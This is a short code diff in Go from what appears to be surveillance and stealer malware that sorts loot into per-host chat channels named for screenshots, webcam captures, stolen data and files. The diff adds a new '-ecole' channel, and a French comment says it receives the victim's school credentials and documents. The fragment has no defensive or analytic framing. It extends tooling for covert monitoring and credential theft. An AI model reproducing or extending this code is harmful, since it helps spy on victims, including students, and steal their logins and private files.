@@ -295,6 +295,7 @@ func allChannelNames() []string {
 		host + "-screenshots",
 		host + "-webcam",
 		host + "-steal",
+		host + "-ecole",
 		host + "-infos",
 		host + "-files-eval",
 		host + "-files-pdf",
@@ -351,6 +352,18 @@ func stealChannel() string {
 // salon de commande pour que celui-ci reste lisible.
 func infosChannel() string {
 	id, done := namedChannel(hostChannelName() + "-infos")
+	if id != "" {
+		return id
+	}
+	if done {
+		return targetChannel()
+	}
+	return ""
+}
+
+// ecoleChannel recoit les identifiants et documents scolaires.
+func ecoleChannel() string {
+	id, done := namedChannel(hostChannelName() + "-ecole")
 	if id != "" {
 		return id
 	}
